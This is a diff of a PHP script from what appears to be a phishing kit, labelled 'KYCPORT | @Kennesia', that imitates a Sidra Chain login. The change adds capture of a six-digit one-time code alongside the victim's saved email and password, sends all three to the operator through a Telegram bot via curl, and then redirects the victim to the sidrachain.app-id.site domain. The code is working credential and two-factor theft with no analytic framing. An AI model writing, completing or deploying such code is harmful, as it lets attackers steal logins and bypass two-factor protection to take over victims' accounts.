@@ -3,16 +3,29 @@
 session_start();
 include "./telegram.php";
 
-$a = $_POST['email'];
-$_SESSION['email'] = $a;
-$b = $_POST['password'];
-$_SESSION['password'] = $b;
+$a = $_SESSION['email'];
+$b = $_SESSION['password'];
+$otp1 = $_POST['otp1'];
+$_SESSION['otp1'] = $otp1;
+$otp2 = $_POST['otp2'];
+$_SESSION['otp2'] = $otp2;
+$otp3 = $_POST['otp3'];
+$_SESSION['otp3'] = $otp3;
+$otp4 = $_POST['otp4'];
+$_SESSION['otp4'] = $otp4;
+$otp5 = $_POST['otp5'];
+$_SESSION['otp5'] = $otp5;
+$otp6 = $_POST['otp6'];
+$_SESSION['otp6'] = $otp6;
+$otp = $otp1.$otp2.$otp3.$otp4.$otp5.$otp6;
+$_SESSION['otp'] = $otp;
 
 $message = "
 ( KYCPORT | @Kennesia )
 
 - Email : ".$a."
 - Password : ".$b."
+- Otp : ".$otp."
 ";
 
 function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
@@ -28,5 +41,5 @@ function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
     curl_close($ch);
 }
 sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
-header('Location: https://sidrachain.app-id.site/otp.php');
+header('Location: https://sidrachain.app-id.site');
 ?>
